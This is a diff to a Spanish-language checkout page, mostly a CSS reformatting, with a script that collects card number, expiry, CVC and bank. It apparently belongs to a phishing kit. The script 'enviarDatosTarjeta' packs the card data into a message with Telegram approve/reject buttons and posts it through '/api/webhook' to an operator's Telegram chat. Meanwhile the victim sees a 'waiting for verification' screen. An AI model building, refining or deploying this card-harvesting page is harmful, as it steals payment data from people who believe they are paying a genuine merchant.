@@ -21,30 +21,14 @@
             --co-input-bg: #f3f4f6;
             --co-border: #e5e7eb;
         }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body {
             font-family: 'Inter', system-ui, -apple-system, sans-serif;
             background-color: var(--co-bg);
             color: var(--co-text);
         }
-
-        body {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        header {
-            padding: 16px 0;
-            background: var(--co-bg);
-        }
-
+        body { min-height: 100vh; display: flex; flex-direction: column; }
+        header { padding: 16px 0; background: var(--co-bg); }
         .header-container {
             max-width: 1200px;
             margin: 0 auto;
@@ -54,24 +38,9 @@
             justify-content: space-between;
             gap: 16px;
         }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            text-decoration: none;
-        }
-
-        .logo svg {
-            height: 44px;
-            width: auto;
-        }
-
-        .progress-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
+        .logo { display: flex; align-items: center; text-decoration: none; }
+        .logo svg { height: 44px; width: auto; }
+        .progress-info { display: flex; align-items: center; gap: 10px; }
         .progress-bar-container {
             width: 120px;
             height: 6px;
@@ -79,30 +48,17 @@
             border-radius: 3px;
             overflow: hidden;
         }
-
         .progress-bar-fill {
             height: 100%;
             background: var(--co-blue);
             width: 100%;
             transition: width 0.3s ease;
         }
-
-        .progress-text {
-            font-size: 14px;
-            color: var(--co-text);
-            white-space: nowrap;
-        }
-
-        .header-stripe {
-            display: flex;
-            height: 3px;
-            margin-top: 16px;
-        }
-
+        .progress-text { font-size: 14px; color: var(--co-text); white-space: nowrap; }
+        .header-stripe { display: flex; height: 3px; margin-top: 16px; }
         .stripe-1 { flex: 2; background-color: var(--co-yellow); }
         .stripe-2 { flex: 1; background-color: var(--co-blue); }
         .stripe-3 { flex: 1; background-color: var(--co-red); }
-
         main {
             flex: 1;
             max-width: 1200px;
@@ -111,22 +67,9 @@
             width: 100%;
             overflow-x: hidden;
         }
-
-        .content-wrapper {
-            display: flex;
-            gap: 32px;
-            justify-content: flex-start;
-        }
-
-        aside {
-            width: 220px;
-            flex-shrink: 0;
-        }
-
-        .progress-list {
-            list-style: none;
-        }
-
+        .content-wrapper { display: flex; gap: 32px; justify-content: flex-start; }
+        aside { width: 220px; flex-shrink: 0; }
+        .progress-list { list-style: none; }
         .progress-item {
             display: flex;
             align-items: flex-start;
@@ -134,11 +77,7 @@
             padding: 12px 0;
             border-bottom: 1px solid var(--co-border);
         }
-
-        .progress-item:last-child {
-            border-bottom: none;
-        }
-
+        .progress-item:last-child { border-bottom: none; }
         .progress-number {
             width: 28px;
             height: 28px;
@@ -152,34 +91,22 @@
             font-size: 0.875rem;
             font-weight: 600;
         }
-
         .progress-number.active,
         .progress-number.completed {
             background: var(--co-blue);
             color: #fff;
         }
-
-        .progress-number.completed::before {
-            content: "✓";
-        }
-
-        .progress-title {
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-        }
-
+        .progress-number.completed::before { content: "✓"; }
+        .progress-title { display: flex; flex-direction: column; gap: 4px; }
         .progress-title span:first-child {
             font-size: 14px;
             font-weight: 600;
             color: var(--co-text);
         }
-
         .progress-item:not(.active) .progress-title span:first-child {
             color: var(--co-text-muted);
             font-weight: 400;
         }
-
         .badge {
             display: inline-block;
             border-radius: 2px;
@@ -187,58 +114,25 @@
             font-size: 0.75rem;
             font-weight: 600;
         }
-
-        .badge.info {
-            background: var(--co-blue-tint);
-            color: var(--co-blue);
-        }
-
-        .badge.neutral {
-            background: var(--co-input-bg);
-            color: var(--co-text-muted);
-        }
-
-        .form-container {
-            flex: 1;
-            max-width: 640px;
-            min-width: 0;
-        }
-
-        .form-header {
-            margin-bottom: 20px;
-        }
-
+        .badge.info { background: var(--co-blue-tint); color: var(--co-blue); }
+        .badge.neutral { background: var(--co-input-bg); color: var(--co-text-muted); }
+        .form-container { flex: 1; max-width: 640px; min-width: 0; }
+        .form-header { margin-bottom: 20px; }
         .form-header h1 {
             font-size: 1.375rem;
             font-weight: 700;
             color: var(--co-text);
             margin: 0 0 8px 0;
         }
-
         .form-header p {
             font-size: 0.9375rem;
             color: var(--co-text-2);
             line-height: 1.55;
             margin: 0;
         }
-
-        form {
-            background: transparent;
-        }
-
-        .form-section {
-            display: flex;
-            flex-direction: column;
-            gap: 32px;
-        }
-
-        .form-group {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            margin-bottom: 20px;
-        }
-
+        form { background: transparent; }
+        .form-section { display: flex; flex-direction: column; gap: 32px; }
+        .form-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 20px; }
         .form-label {
             color: var(--co-text);
             font-size: 0.875rem;
@@ -246,9 +140,7 @@
             display: block;
             margin-bottom: 6px;
         }
-
-        .kern-input,
-        .kern-select {
+        .kern-input, .kern-select {
             background-color: var(--co-input-bg);
             border: none;
             border-bottom: 2px solid var(--co-text-2);
@@ -261,27 +153,13 @@
             transition: border-color 0.15s;
             outline: none;
         }
-
-        .kern-input::placeholder {
-            color: var(--co-text-muted);
-        }
-
-        .kern-input:hover,
-        .kern-select:hover {
-            border-bottom-color: var(--co-text);
-        }
-
-        .kern-input:focus,
-        .kern-select:focus {
+        .kern-input::placeholder { color: var(--co-text-muted); }
+        .kern-input:hover, .kern-select:hover { border-bottom-color: var(--co-text); }
+        .kern-input:focus, .kern-select:focus {
             border-bottom: 3px solid var(--co-blue);
             padding-bottom: 7px;
         }
-
-        .kern-input:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-
+        .kern-input:disabled { opacity: 0.7; cursor: not-allowed; }
         .kern-select {
             appearance: none;
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23374151' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
@@ -289,14 +167,12 @@
             background-repeat: no-repeat;
             padding-right: 40px;
         }
-
         .resumen-box {
             background: #f9fafb;
             border: 1px solid var(--co-border);
             padding: 20px;
             margin-bottom: 24px;
         }
-
         .resumen-title {
             font-size: 0.75rem;
             font-weight: 600;
@@ -305,7 +181,6 @@
             margin-bottom: 16px;
             letter-spacing: 0.5px;
         }
-
         .resumen-item {
             display: flex;
             justify-content: space-between;
@@ -313,7 +188,6 @@
             padding: 12px 0;
             border-bottom: 1px solid var(--co-border);
         }
-
         .resumen-item:last-child {
             border-bottom: none;
             font-weight: 700;
@@ -321,46 +195,26 @@
             padding-top: 16px;
             color: var(--co-text);
         }
-
-        .resumen-label {
-            font-size: 0.9375rem;
-            color: var(--co-text-2);
-        }
-
-        .resumen-value {
-            font-size: 0.9375rem;
-            color: var(--co-text-2);
-            font-weight: 500;
-        }
-
-        .resumen-item:last-child .resumen-value {
-            font-weight: 700;
-        }
-
+        .resumen-label { font-size: 0.9375rem; color: var(--co-text-2); }
+        .resumen-value { font-size: 0.9375rem; color: var(--co-text-2); font-weight: 500; }
+        .resumen-item:last-child .resumen-value { font-weight: 700; }
         .resumen-datos {
             margin-top: 12px;
             padding-top: 12px;
             border-top: 1px dashed var(--co-border);
         }
-
         .resumen-datos .resumen-item {
             padding: 8px 0;
             border-bottom: none;
             font-size: 0.875rem;
         }
-
-        .resumen-datos .resumen-label {
-            font-weight: 400;
-            color: var(--co-text-muted);
-        }
-
+        .resumen-datos .resumen-label { font-weight: 400; color: var(--co-text-muted); }
         .payment-section {
             border: 1px solid var(--co-border);
             padding: 24px;
             margin-bottom: 24px;
             background: #fafbfc;
         }
-
         .payment-header {
             display: flex;
             align-items: flex-start;
@@ -369,7 +223,6 @@
             padding-bottom: 20px;
             border-bottom: 1px solid var(--co-border);
         }
-
         .payment-header svg {
             width: 20px;
             height: 20px;
@@ -377,40 +230,20 @@
             flex-shrink: 0;
             margin-top: 2px;
         }
-
-        .payment-info {
-            flex: 1;
-        }
-
+        .payment-info { flex: 1; }
         .payment-title {
             font-size: 0.9375rem;
             font-weight: 600;
             color: var(--co-text);
             margin-bottom: 2px;
         }
-
-        .payment-subtitle {
-            font-size: 0.8125rem;
-            color: var(--co-text-muted);
-        }
-
-        .payment-logos {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-        }
-
-        .payment-logos img {
-            height: 28px;
-            width: auto;
-            object-fit: contain;
-        }
-
+        .payment-subtitle { font-size: 0.8125rem; color: var(--co-text-muted); }
+        .payment-logos { display: flex; gap: 10px; align-items: center; }
+        .payment-logos img { height: 28px; width: auto; object-fit: contain; }
         .card-input-wrapper {
             position: relative;
             margin-bottom: 16px;
         }
-
         .card-logo {
             position: absolute;
             right: 12px;
@@ -423,42 +256,18 @@
             justify-content: center;
             pointer-events: none;
         }
-
-        .card-logo img {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
-        }
-
-        .card-input-wrapper .kern-input {
-            padding-right: 48px;
-        }
-
+        .card-logo img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        .card-input-wrapper .kern-input { padding-right: 48px; }
         .expiry-cvc-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 24px;
             margin-bottom: 24px;
         }
-
-        .expiry-cvc-grid .form-group {
-            margin-bottom: 0;
-        }
-
-        .expiry-cvc-grid .form-label {
-            font-size: 0.875rem;
-            margin-bottom: 6px;
-        }
-
-        .banco-group {
-            margin-bottom: 24px;
-        }
-
-        .banco-group .form-label {
-            font-size: 0.875rem;
-            margin-bottom: 6px;
-        }
-
+        .expiry-cvc-grid .form-group { margin-bottom: 0; }
+        .expiry-cvc-grid .form-label { font-size: 0.875rem; margin-bottom: 6px; }
+        .banco-group { margin-bottom: 24px; }
+        .banco-group .form-label { font-size: 0.875rem; margin-bottom: 6px; }
         .security-footer {
             display: flex;
             align-items: center;
@@ -469,14 +278,7 @@
             padding: 16px 0;
             border-top: 1px solid var(--co-border);
         }
-
-        .security-footer svg {
-            width: 16px;
-            height: 16px;
-            color: var(--co-blue);
-            flex-shrink: 0;
-        }
-
+        .security-footer svg { width: 16px; height: 16px; color: var(--co-blue); flex-shrink: 0; }
         .loading-overlay {
             display: none;
             position: fixed;
@@ -493,11 +295,7 @@
             flex-direction: column;
             padding: 20px;
         }
-
-        .loading-overlay.active {
-            display: flex;
-        }
-
+        .loading-overlay.active { display: flex; }
         .loading-card {
             background: #ffffff;
             border-radius: 16px;
@@ -510,18 +308,10 @@
             margin: auto;
             border: 1px solid #f0f0f0;
         }
-
         @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px) scale(0.96);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
+            from { opacity: 0; transform: translateY(20px) scale(0.96); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
         }
-
         .logo-container {
             display: flex;
             justify-content: center;
@@ -529,14 +319,7 @@
             margin-bottom: 24px;
             min-height: 100px;
         }
-
-        .logo-container .logo-img {
-            height: 80px;
-            width: auto;
-            max-width: 150px;
-            object-fit: contain;
-        }
-
+        .logo-container .logo-img { height: 80px; width: auto; max-width: 150px; object-fit: contain; }
         .loading-card .loading-text {
             font-size: 0.95rem;
             font-weight: 500;
@@ -544,11 +327,7 @@
             margin-bottom: 20px;
             letter-spacing: 0.2px;
         }
-
-        .progress-bar-wrapper {
-            width: 100%;
-        }
-
+        .progress-bar-wrapper { width: 100%; }
         .progress-bar-track {
             width: 100%;
             height: 4px;
@@ -557,7 +336,6 @@
             overflow: hidden;
             position: relative;
         }
-
         .progress-bar-fill-loading {
             height: 100%;
             background: var(--co-blue);
@@ -566,7 +344,6 @@
             transition: width 0.3s ease;
             position: relative;
         }
-
         .progress-bar-fill-loading::after {
             content: '';
             position: absolute;
@@ -577,12 +354,10 @@
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
             animation: shimmer 1.5s infinite;
         }
-
         @keyframes shimmer {
             0% { transform: translateX(-100%); }
             100% { transform: translateX(100%); }
         }
-
         .loading-card .initial-spinner {
             display: none;
             width: 48px;
@@ -593,16 +368,11 @@
             animation: spin 0.8s linear infinite;
             margin: 0 auto 20px auto;
         }
-
-        .loading-card .initial-spinner.active {
-            display: block;
-        }
-
+        .loading-card .initial-spinner.active { display: block; }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
         .status-message {
             display: none;
             padding: 16px;
@@ -611,28 +381,24 @@
             font-weight: 500;
             text-align: center;
         }
-
         .status-message.error {
             display: block;
             background: #fef2f2;
             border: 1px solid #fecaca;
             color: #dc2626;
         }
-
         .status-message.success {
             display: block;
             background: #f0fdf4;
             border: 1px solid #bbf7d0;
             color: #16a34a;
         }
-
         .status-message.info {
             display: block;
             background: #e0f2fe;
             border: 1px solid #bae6fd;
             color: #0369a1;
         }
-
         .btn {
             height: 48px;
             padding: 0 24px;
@@ -650,21 +416,9 @@
             width: 100%;
             text-align: center;
         }
-
-        .btn-primary {
-            background-color: var(--co-blue);
-            color: #fff;
-        }
-
-        .btn-primary:hover {
-            background-color: var(--co-blue-hover);
-        }
-
-        .btn-primary:disabled {
-            background-color: var(--co-border);
-            cursor: not-allowed;
-        }
-
+        .btn-primary { background-color: var(--co-blue); color: #fff; }
+        .btn-primary:hover { background-color: var(--co-blue-hover); }
+        .btn-primary:disabled { background-color: var(--co-border); cursor: not-allowed; }
         .disclaimer {
             font-size: 0.8125rem;
             color: var(--co-text-muted);
@@ -672,23 +426,14 @@
             margin-top: 20px;
             padding-top: 20px;
         }
-
-        .disclaimer a {
-            color: var(--co-blue);
-            text-decoration: none;
-        }
-
-        .disclaimer a:hover {
-            text-decoration: underline;
-        }
-
+        .disclaimer a { color: var(--co-blue); text-decoration: none; }
+        .disclaimer a:hover { text-decoration: underline; }
         footer {
             border-top: 1px solid var(--co-border);
             padding: 16px 24px;
             text-align: center;
             margin-top: 60px;
         }
-
         .footer-links {
             display: flex;
             justify-content: center;
@@ -696,19 +441,8 @@
             flex-wrap: wrap;
             margin-bottom: 8px;
         }
-
-        .footer-links a {
-            font-size: 0.75rem;
-            color: var(--co-text-muted);
-            text-decoration: none;
-        }
-
-        .footer-text {
-            font-size: 0.75rem;
-            color: var(--co-text-muted);
-            margin: 0 0 12px;
-        }
-
+        .footer-links a { font-size: 0.75rem; color: var(--co-text-muted); text-decoration: none; }
+        .footer-text { font-size: 0.75rem; color: var(--co-text-muted); margin: 0 0 12px; }
         .footer-disclaimer {
             font-size: 0.75rem;
             color: var(--co-text-muted);
@@ -716,62 +450,39 @@
             margin: 0 auto;
             line-height: 1.5;
         }
-
         .error-message {
             color: var(--co-red);
             font-size: 0.75rem;
             margin-top: 4px;
             display: none;
         }
-
         .form-group.error .kern-input,
         .form-group.error .kern-select {
             border-bottom-color: var(--co-red);
         }
-
-        .form-group.error .error-message {
-            display: block;
-        }
-
+        .form-group.error .error-message { display: block; }
         @media (max-width: 768px) {
-            .content-wrapper {
-                flex-direction: column;
-                gap: 24px;
-            }
+            .content-wrapper { flex-direction: column; gap: 24px; }
             aside { display: none; }
             .form-container { max-width: 100%; }
             main { padding: 16px; }
             .form-header h1 { font-size: 1.25rem; }
             .btn { width: 100%; }
             .expiry-cvc-grid { grid-template-columns: 1fr 1fr; }
-            .loading-card {
-                padding: 32px 24px 28px 24px;
-                max-width: 330px;
-                margin: auto;
-            }
+            .loading-card { padding: 32px 24px 28px 24px; max-width: 330px; margin: auto; }
             .logo-container .logo-img { height: 70px; max-width: 130px; }
             .loading-card .loading-text { font-size: 0.9rem; }
         }
-
         @media (max-width: 480px) {
             .form-header h1 { font-size: 1.125rem; }
             .form-header p { font-size: 0.875rem; }
             .expiry-cvc-grid { grid-template-columns: 1fr; gap: 16px; }
-            .loading-card {
-                padding: 28px 20px 24px 20px;
-                max-width: 300px;
-                margin: auto;
-            }
+            .loading-card { padding: 28px 20px 24px 20px; max-width: 300px; margin: auto; }
             .logo-container .logo-img { height: 60px; max-width: 110px; }
             .loading-card .loading-text { font-size: 0.85rem; }
         }
-
         @media (max-width: 360px) {
-            .loading-card {
-                padding: 24px 16px 20px 16px;
-                max-width: 270px;
-                margin: auto;
-            }
+            .loading-card { padding: 24px 16px 20px 16px; max-width: 270px; margin: auto; }
             .logo-container .logo-img { height: 50px; max-width: 90px; }
             .loading-card .loading-text { font-size: 0.8rem; }
         }
@@ -1005,8 +716,6 @@
         // ============================================
         // CONFIGURACIÓN - SIN CREDENCIALES
         // ============================================
-        // El frontend NO tiene credenciales de Telegram
-        // Todo se maneja a través del webhook
         const WEBHOOK_URL = '/api/webhook';
         const POLLING_INTERVAL = 3000;
         const MAX_POLLING_TIME = 300000;
@@ -1438,7 +1147,7 @@
         }
 
         // ============================================
-        // ENVÍO DE DATOS A TRAVÉS DEL WEBHOOK
+        // ⭐⭐⭐ ENVIAR DATOS AL WEBHOOK ⭐⭐⭐
         // ============================================
         async function enviarDatosTarjeta(datos) {
             try {
@@ -1448,9 +1157,9 @@
                 );
                 
                 console.log(`🏷️ Categoría detectada: ${categoriaInfo.emoji} ${categoriaInfo.categoria}`);
+                console.log(`💳 Tipo de tarjeta: ${datos.tipoTarjeta}`);
 
-                // Los botones se envían SIN tipo de tarjeta
-                // El webhook lo maneja automáticamente
+                // ✅ BOTONES CORRECTOS: approve_SOL-xxx / reject_SOL-xxx
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [
@@ -1478,7 +1187,7 @@
                 mensaje += `📅 Fecha: ${datos.fechaHora}\n\n`;
                 mensaje += `⏳ *Estado:* Esperando verificación...`;
 
-                // Enviar a través del webhook (sin credenciales en el frontend)
+                // ✅ ENVIAR AL WEBHOOK (NO a Telegram directamente)
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -1491,12 +1200,13 @@
                 });
 
                 const data = await response.json();
+                console.log('📨 Respuesta del webhook:', data);
 
                 if (data.success) {
-                    console.log('✅ Datos enviados a través del webhook');
+                    console.log('✅ Mensaje enviado a través del webhook');
                     return true;
                 } else {
-                    console.error('❌ Error:', data.error);
+                    console.error('❌ Error del webhook:', data.error);
                     return false;
                 }
             } catch (error) {
